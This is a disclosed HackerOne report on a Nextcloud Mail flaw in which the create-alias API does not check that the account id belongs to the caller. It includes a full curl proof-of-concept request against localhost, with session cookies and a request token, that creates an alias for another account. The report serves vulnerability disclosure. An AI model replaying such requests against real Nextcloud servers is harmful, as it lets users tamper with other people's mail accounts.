# Create alias does not validate account id

## Report Details
- **Report ID**: 1129996
- **URL**: https://hackerone.com/reports/1129996
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-18T11:41:55.265Z
- **Disclosed**: 2021-06-01T08:40:50.188Z

## Reporter
- **Username**: kesselb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
The request to create a new alias does not validate that account id belongs to the current user.  Also we don't validate that the account id exists. 

```
curl 'http://localhost:50001/index.php/apps/mail/api/accounts/2000/aliases' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'requesttoken: 75bTbDfs3loR2Vr8pYPtefIjwiAQzQUtg2f9oeASmxI=:uv+XIBzaqg51imjI9/WcFZobsFpUiF1GsgiYio961Uc=' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Origin: http://localhost:50001' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: oc_sessionPassphrase=A%2BwmqbZZ4JJAydZ1Wg68GDAAhSdoipmHWCWTwfEJTIHmYyh6D59aMjilXtuhYbF8NMvfrUsvDuZ43d8nm91kpx0oe%2BnKm31YjI9%2FU0WsJK4Zqy5ygsi92Nhu4EPIn8%2Bg; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc5hwbau68t9=95154162557362dd231a75e7b065b1ea; nc_username=bob; nc_token=oe2FicKizx%2BUvvdToxpu%2Biob2h3vMJOD; nc_session_id=95154162557362dd231a75e7b065b1ea' \
  --data-raw '{"aliasName":"hello hello hello","alias":"hellohello@test.local"}' \
  --compressed
```

Request above will create a alias with account id = 2000 even if there is no such account.

## Impact

An attacker could create an alias (for an existing mail account) for another users.

## Attachments
No attachments
